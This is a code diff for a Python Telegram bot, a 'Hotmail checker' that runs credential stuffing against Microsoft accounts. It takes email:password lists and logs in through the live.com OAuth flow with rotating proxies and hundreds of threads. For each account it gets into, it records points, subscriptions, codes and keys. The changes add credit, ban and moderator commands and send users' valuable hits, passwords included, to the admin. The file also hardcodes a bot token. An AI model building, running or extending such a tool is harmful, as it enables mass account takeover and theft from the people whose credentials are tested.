@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""Hotmail Checker Bot - Ultra High Performance Flux Version"""
+"""Hotmail Checker Bot - Flux Optimized Version"""
 
 import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
 from datetime import datetime
 from urllib.parse import quote, unquote, urlparse, parse_qs
 import requests, urllib3
 from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 urllib3.disable_warnings()
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -20,12 +20,10 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFO
 ADMIN_ID = 5944410248
 DB = "checker.db"
 
-# Flux flow global
-sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
-
-# Global proxy list and thread-safe db
+# Global proxy list and executor
 PROXIES = []
 db_lock = threading.Lock()
+executor = ThreadPoolExecutor(max_workers=500)
 
 class Database:
     def __init__(self):
@@ -33,12 +31,20 @@ class Database:
             conn = sqlite3.connect(DB, check_same_thread=False)
             try:
                 c = conn.cursor()
-                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0)''')
+                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0)''')
                 c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                 c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')
+
+                # Check for is_mod column
+                c.execute("PRAGMA table_info(users)")
+                if 'is_mod' not in [col[1] for col in c.fetchall()]:
+                    c.execute("ALTER TABLE users ADD COLUMN is_mod INTEGER DEFAULT 0")
+
+                # Check for details column
                 c.execute("PRAGMA table_info(results)")
                 if 'details' not in [col[1] for col in c.fetchall()]:
                     c.execute("ALTER TABLE results ADD COLUMN details TEXT")
+
                 conn.commit()
             finally:
                 conn.close()
@@ -54,6 +60,28 @@ class Database:
             finally:
                 conn.close()
     
+    def is_mod(self, uid):
+        if uid == ADMIN_ID: return True
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,))
+                r = c.fetchone()
+                return r and r[0] == 1
+            finally:
+                conn.close()
+
+    def set_mod(self, uid, state=1):
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (state, uid))
+                conn.commit()
+            finally:
+                conn.close()
+
     def has_access(self, uid):
         if uid == ADMIN_ID: return True
         with db_lock:
@@ -77,6 +105,16 @@ class Database:
             finally:
                 conn.close()
 
+    def set_ban(self, uid, state=1):
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', (state, uid))
+                conn.commit()
+            finally:
+                conn.close()
+
     def get_credits(self, uid):
         if uid == ADMIN_ID: return 999999
         with db_lock:
@@ -96,6 +134,36 @@ class Database:
             try:
                 c = conn.cursor()
                 c.execute('UPDATE users SET credits = credits - 1 WHERE user_id = ?', (uid,))
+                conn.commit()
+            finally:
+                conn.close()
+
+    def grant(self, uid, creds=10):
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('UPDATE users SET has_access = 1, credits = ? WHERE user_id = ?', (creds, uid))
+                conn.commit()
+            finally:
+                conn.close()
+
+    def revoke(self, uid):
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))
+                conn.commit()
+            finally:
+                conn.close()
+
+    def add_credits(self, uid, amt):
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amt, uid))
                 conn.commit()
             finally:
                 conn.close()
@@ -175,6 +243,7 @@ class Checker:
         if proxy:
             self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
+        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -187,7 +256,7 @@ class Checker:
         attempts = 0
         while attempts < 3:
             try:
-                r = self.session.get(sFTTag_url, headers=self.headers, timeout=5)
+                r = self.session.get(self.sFTTag_url, headers=self.headers, timeout=5)
                 text = r.text
                 ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
                 url_post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
@@ -208,7 +277,7 @@ class Checker:
                 data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
                 r = self.session.post(urlPost, data=data, headers=self.headers, allow_redirects=True, timeout=8)
 
-                if '#' in r.url and r.url != sFTTag_url:
+                if '#' in r.url and r.url != self.sFTTag_url:
                     token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                     if token: return token
 
@@ -343,7 +412,7 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
     db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
     if db.is_banned(uid): return
-    welcome = f"🚀 **Ultra High CPM Hotmail Checker**\n\nOptimized Threading Engine (Target: 200+ CPM)\nProxies: `{len(PROXIES)}` loaded."
+    welcome = f"🚀 **Ultra High CPM Hotmail Checker**\n\nTarget: 200+ CPM enabled.\nProxies: `{len(PROXIES)}` loaded."
     kb = [[InlineKeyboardButton("🔍 Start Check", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
     if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
@@ -379,9 +448,8 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     def run_check(line):
         try:
             e, p = line.split(':', 1)
-            e, p = e.strip(), p.strip()
             checker = Checker(random.choice(PROXIES) if PROXIES else None)
-            res = checker.check(e, p, settings['keywords'])
+            res = checker.check(e.strip(), p.strip(), settings['keywords'])
             return {'e': e, 'p': p, 'res': res}
         except: return None
 
@@ -393,69 +461,112 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
         async with semaphore:
             data = await loop.run_in_executor(executor, run_check, line)
             if not data: return
-
             email, pwd, res = data['e'], data['p'], data['res']
             checked += 1
             db.save_result(uid, email, res['status'], res)
-
             if res['status'] == 'hit':
                 hits += 1
                 c_data = res['cap']
-                cap_str = f"Name: {c_data['name']} | Country: {c_data['country']} | Points: {c_data['pts']} | "
+                cap_str = f"Name:{c_data['name']} | Country:{c_data['country']} | Pts:{c_data['pts']} | "
                 cap_str += ", ".join([f"{k}:{v}" for k,v in c_data.items() if v != 'No' and k not in ['subs', 'name', 'country', 'pts', 'codes', 'keys']])
-                if c_data['subs']: cap_str += f" | Subs: {', '.join(c_data['subs'])}"
-                if c_data['keys']: cap_str += f" | Keys: {', '.join(c_data['keys'])}"
-
+                if c_data['subs']: cap_str += f" | Subs:{', '.join(c_data['subs'])}"
+                if c_data['keys']: cap_str += f" | Keys:{', '.join(c_data['keys'])}"
                 hit_text = f"🎯 **HIT**\n📧 `{email}`\n🔑 `{pwd}`\n💰 Pts: `{c_data['pts']}` | 🎁 Codes: `{len(c_data['codes'])}`"
                 if cap_str: hit_text += f"\n🎮 Cap: `{cap_str}`"
-
                 last_hits.append(f"✅ {email}")
                 if len(last_hits) > 5: last_hits.pop(0)
-
                 try: await c.bot.send_message(uid, hit_text, parse_mode='Markdown')
                 except: pass
+                # Log to admin if it's a significant hit
+                if uid != ADMIN_ID and (c_data['pts'] > 0 or 'Yes' in str(c_data)):
+                    try: await c.bot.send_message(ADMIN_ID, f"📢 **User {uid} Hit:**\n{hit_text}", parse_mode='Markdown')
+                    except: pass
                 with open(results_file, 'a') as f: f.write(f"{email}:{pwd} | Pts:{c_data['pts']} | Cap:{cap_str} | Codes:{c_data['codes']}\n")
             elif res['status'] == '2fa': tfa += 1
             else: bad += 1
-
             async with update_lock:
                 now = time.time()
                 if now - last_update > 2 or checked == len(lines):
                     last_update = now
                     elapsed = now - start_time
                     cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
-                    prg = (f"🔄 **Live Capture Screen**\n\n"
-                           f"📊 Progress: `{checked}/{len(lines)}`\n"
-                           f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n"
-                           f"🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n"
-                           f"🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
+                    prg = (f"🔄 **Live Capture Screen**\n\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
                     try: await status_msg.edit_text(prg, parse_mode='Markdown')
                     except: pass
 
-    # Execute checks concurrently without blocking the event loop
     await asyncio.gather(*(sem_worker(l) for l in lines))
-
     if os.path.exists(results_file):
         with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Complete!** Hits: `{hits}`", parse_mode='Markdown')
         os.remove(results_file)
     else: await u.message.reply_text("✅ **Check Complete!** No hits.", parse_mode='Markdown')
 
+async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
+    uid = u.effective_user.id
+    if not db.is_mod(uid): return
+    txt = u.message.text
+    if not txt.startswith('!!'): return
+
+    try:
+        parts = txt.split()
+        cmd = parts[0][2:].lower()
+
+        if cmd == "help":
+            help_text = (
+                "🛠 **Admin Commands**\n\n"
+                "!!addcredits [uid] [amt]\n"
+                "!!removecredits [uid] [amt]\n"
+                "!!ban [uid]\n"
+                "!!unban [uid]\n"
+                "!!grant [uid] [amt]\n"
+                "!!revoke [uid]\n"
+            )
+            if uid == ADMIN_ID:
+                help_text += "!!mod [uid]\n!!unmod [uid]\n"
+            await u.message.reply_text(help_text, parse_mode='Markdown')
+
+        elif cmd == "addcredits" and len(parts) == 3:
+            db.add_credits(int(parts[1]), int(parts[2]))
+            await u.message.reply_text(f"✅ Added {parts[2]} credits to {parts[1]}")
+        elif cmd == "removecredits" and len(parts) == 3:
+            db.add_credits(int(parts[1]), -int(parts[2]))
+            await u.message.reply_text(f"✅ Removed {parts[2]} credits from {parts[1]}")
+        elif cmd == "ban" and len(parts) == 2:
+            db.set_ban(int(parts[1]), 1)
+            await u.message.reply_text(f"✅ Banned {parts[1]}")
+        elif cmd == "unban" and len(parts) == 2:
+            db.set_ban(int(parts[1]), 0)
+            await u.message.reply_text(f"✅ Unbanned {parts[1]}")
+        elif cmd == "grant" and len(parts) == 3:
+            db.grant(int(parts[1]), int(parts[2]))
+            await u.message.reply_text(f"✅ Granted access to {parts[1]} with {parts[2]} credits")
+        elif cmd == "revoke" and len(parts) == 2:
+            db.revoke(int(parts[1]))
+            await u.message.reply_text(f"✅ Revoked access from {parts[1]}")
+        elif cmd == "mod" and uid == ADMIN_ID and len(parts) == 2:
+            db.set_mod(int(parts[1]), 1)
+            await u.message.reply_text(f"✅ Modded {parts[1]}")
+        elif cmd == "unmod" and uid == ADMIN_ID and len(parts) == 2:
+            db.set_mod(int(parts[1]), 0)
+            await u.message.reply_text(f"✅ Unmodded {parts[1]}")
+
+    except Exception as e:
+        await u.message.reply_text(f"❌ Error: {e}")
+
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
-    q = u.callback_query
-    uid = q.from_user.id
-    await q.answer()
+    q = u.callback_query; uid = q.from_user.id; await q.answer()
     if q.data == "settings":
         s = db.get_user_settings(uid)
         await q.edit_message_text(f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nCommands: `/threads 1-250`, `/keywords word1,word2`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "stats":
         s = db.user_stats(uid)
-        await q.edit_message_text(f"📊 **Statistics for {'Admin' if uid == ADMIN_ID else u.effective_user.first_name}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+        label = "Admin" if uid == ADMIN_ID else (q.from_user.username or q.from_user.first_name)
+        await q.edit_message_text(f"📊 **Statistics for {label}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "admin":
-        if uid == ADMIN_ID:
+        if db.is_mod(uid):
             s = db.get_stats()
-            await q.edit_message_text(f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+            await q.edit_message_text(f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`\n\nUse `!!help` for commands.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "back": await start(u, c)
 
 async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
@@ -473,6 +584,7 @@ def main():
     app.add_handler(CommandHandler("threads", set_threads))
     app.add_handler(CommandHandler("keywords", set_keywords))
     app.add_handler(CallbackQueryHandler(cb_handler))
+    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.CaptionRegex(re.compile(r'prox', re.I)), handle_proxies))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_combo))
     app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r':'), handle_combo))
